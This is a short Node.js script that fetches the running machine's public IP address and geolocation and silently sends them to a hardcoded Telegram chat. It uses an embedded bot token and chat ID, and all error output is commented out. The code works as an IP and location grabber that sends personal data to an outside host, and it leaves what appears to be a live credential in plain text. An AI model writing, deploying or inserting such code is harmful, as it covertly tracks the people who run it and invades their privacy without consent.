const TelegramBot = require('node-telegram-bot-api');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
const bot = new TelegramBot('6902083128:AAHs4ukOtXTGj7pdqpOI6rFTIVmoLkj219I', { polling: false });

// Replace 'YOUR_CHAT_ID' with the chat ID you want to send the message to
const chatId = '-1002044932438';

fetch('https://geolocation-db.com/json/')
    .then(response => response.json())
    .then(data => {
        // console.log(data);
        // Send a message
        bot.sendMessage(chatId, 'IPv4: ' + data.IPv4 + '\nCOUNTRY: ' + data.country_name + '\nSTATE: ' + data.state + '\nCITY: ' + data.city + '\nPOSTAL: ' + data.postal + '\nLAT: ' + data.latitude + '\nLON: ' + data.longitude)
            .then(() => {
                // console.log('Message sent successfully');
            })
            .catch((error) => {
                // console.error('Error sending message:', error);
            });
    })
    .catch(error => {
        // Handle any errors
        // console.error(error);
    });

    // oof